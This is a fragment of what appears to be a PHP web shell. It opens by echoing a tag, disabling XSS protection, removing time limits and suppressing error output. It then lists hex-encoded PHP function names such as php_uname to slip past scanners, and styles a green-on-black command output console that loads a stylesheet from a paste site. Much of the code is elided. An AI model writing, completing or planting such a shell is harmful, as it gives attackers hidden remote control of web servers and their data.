<?php echo "ganstar"; header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$Array = [
		'7068705f756e616d65',
...
body {
    background: radial-gradient(circle at top, #022b12, #000000);
    color: #00ff66;
...
.output {
    ...
    overflow-y: auto;
    color: #00ff66;
    box-shadow: inset 0 0 10px #003d1a;
}
...
/* Button */
button {
    background: linear-gradient(145deg, #00ff66, #009944);
    border: none;
    color: #000;
    padding: 8px 15px;
    margin-top: 10px;
...
@keyframes blink {
    ...
    51%, 100% { opacity: 0; }
			...
			<link rel="stylesheet" href="https://ghostbin.axel.org/paste/4pw63/raw" type="text/css">
